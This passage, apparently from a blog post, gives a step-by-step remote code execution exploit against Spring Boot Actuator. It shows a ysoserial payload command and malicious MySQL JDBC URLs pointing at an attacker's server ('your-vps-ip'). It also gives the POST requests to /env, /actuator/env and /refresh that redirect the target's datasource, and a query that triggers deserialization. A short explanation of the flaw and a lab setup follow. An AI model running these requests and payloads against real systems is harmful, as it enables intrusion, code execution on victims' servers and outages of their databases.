Run the [spring-boot-jdbc-deserialization-rce.py](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py) script on a server you control and use [ysoserial](https://github.com/frohoff/ysoserial) to customize the commands to be executed:

```
java -jar ysoserial.jar CommonsCollections3 calc > payload.ser
```

Generate a deserialized payload file in the same directory as the script for the script to use. payload.ser\
[](https://www.blogger.com/#)

**Step 3:** Set the spring.datasource.url property

- Modifying this property will temporarily make all the normal database services of the website unavailable, which will affect the business, please operate with caution!

MySQL-connector-java 5.x version sets the property value to :

|

 |

jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true

 |

mysql-connector-java 8.x version sets the property value to :

|

jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true

 |

**spring 1.x**

**\
**

```
POST /envContent-Type: application/x-www-form-urlencodedspring.datasource.url=corresponding property value
```

**spring 2.x**

|

1

2

3

4

5

 |

POST /actuator/env

Content-Type: application/json

{ "name" : "spring.datasource.url" , "value" : "corresponding property value" }

 |

[](https://www.blogger.com/#)**Step 4:** Refresh the configuration

**spring 1.x\
**

```
POST  /refreshContent-Type: application/x-www-form-urlencoded
```

**spring 2.x**

```
POST /actuator/refreshContent-Type: application/json
```

[](https://www.blogger.com/#)**Step 5:** Trigger database query

- Try to access the known database query interface of the website, such as: /product/list, or find other ways to actively trigger the source website to perform database query, and then the vulnerability will be triggered

[](https://www.blogger.com/#)**Step 6: **restore normal jdbc url

- After the deserialization exploit is complete, use the method in step three to restore the original value spring.datasource.urlrecorded in step onevalue

[](https://www.blogger.com/#)

#### Vulnerability principle:

- The spring.datasource.url property is set to the external malicious MySQL JDBC URL address

- refresh sets a new spring.datasource.url property value after refresh

- When the website performs database queries and other operations, it will try to establish a new database connection using the malicious mysql jdbc url

- The malicious MySQL server will then return the deserialized payload data at the appropriate stage of establishing the connection

- The target-dependent MySQL-connector-java will deserialize the set gadget, resulting in an RCE vulnerability

#### Vulnerability Analysis:

[](https://www.blogger.com/#)

- [New-Exploit-Technique-In-Java-Deserialization-Attack](<https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf>)

[](https://www.blogger.com/#)Vulnerable environment:

- You need to configure the spring.datasource.url, spring. datasource.username, spring.datasource.password in application.properties to ensure that you can connect to the MySQL database normally, otherwise, the program will report an error and exit when it starts.

[repository/springboot-mysql-jdbc-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-mysql-jdbc-rce)

Normal access:

```
http://127.0.0.1:9097/actuator/env _ _ _ _ _ _ _ _
```

The vulnerability is triggered after sending the payload:

```
http://127.0.0.1:9097/product/list _ _ _ _ _ _ _ _
```